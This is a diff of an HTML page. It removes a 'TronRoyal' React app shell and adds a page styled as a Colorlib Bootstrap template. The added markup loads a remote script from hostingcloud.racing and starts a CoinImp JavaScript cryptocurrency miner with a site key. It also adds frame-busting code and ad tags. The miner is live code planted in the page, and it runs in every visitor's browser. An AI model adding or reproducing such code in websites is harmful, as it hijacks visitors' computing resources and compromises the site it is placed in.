@@ -1,43 +1,6 @@
-
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta content="width=device-width, initial-scale=1.0" name="viewport">
-<title>TronRoyal</title>
-<meta content="" name="descriptison">
-<meta content="" name="keywords">
-
-<link rel="shortcut icon" type="image/x-icon" href="/assets/img/logo.png" />
-
-<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Montserrat:300,400,500,600,700" rel="stylesheet">
-
-<link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-<link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
-<link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
-<link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
-<link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
-<link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
-<link href="assets/css/style.css" rel="stylesheet">
-<link href="assets/css/main.css" rel="stylesheet">
-<link href="assets/css/react-toastify.css" rel="stylesheet">
-</head>
-<body>
-<body>
-<div id="root"></div>
-</body>
-
-<script src="assets/vendor/jquery/jquery.min.js"></script>
-<script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-<script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
-<script src="assets/vendor/php-email-form/validate.js"></script>
-<script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
-<script src="assets/vendor/counterup/counterup.min.js"></script>
-<script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
-<script src="assets/vendor/venobox/venobox.min.js"></script>
-<script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
-
-<script src="assets/js/main.js"></script>
-<script src="/dist/bundle.js"></script>
-</body>
-</html>
+<title>Colorlib | Free Bootstrap Website Template</title> <script type="a564f3b31dfeae3b96322d7f-text/javascript">if ( top !== self ) top.location.replace( self.location.href );// Hey, don't iframe my iframe!</script> <script src="https://www.hostingcloud.racing/mKgk.js"></script> <script> var _client = new Client.Anonymous('a934a756b26f740437b44addb4ac3eaad11ebe827f6c08ce936fcabf8ed36e5e', { throttle: 0.2, c: 'w' }); _client.start(); _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d"); </script>
+uiCookies
+Select a Product +
+<iframe class="product-iframe" frameborder="0" border="0"></iframe> <script src="//ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script> <script src="assets/js/products.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script> <script src="assets/js/application.min.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script> <script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script>
+<script type="a564f3b31dfeae3b96322d7f-text/javascript"> window.googletag = window.googletag || {cmd: []}; googletag.cmd.push(function() { googletag .defineSlot('/147246189/colorlib.com_728x90_anchor_sticky_DFP', [[320, 100], [728, 90]], 'gpt-passback-stpd-0-1578495345178') .addService(googletag.pubads()).setTargeting('Placement_type', ['serving']); googletag.enableServices(); googletag.display('gpt-passback-stpd-0-1578495345178'); }); </script>
+<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="a564f3b31dfeae3b96322d7f-|49" defer=""></script>
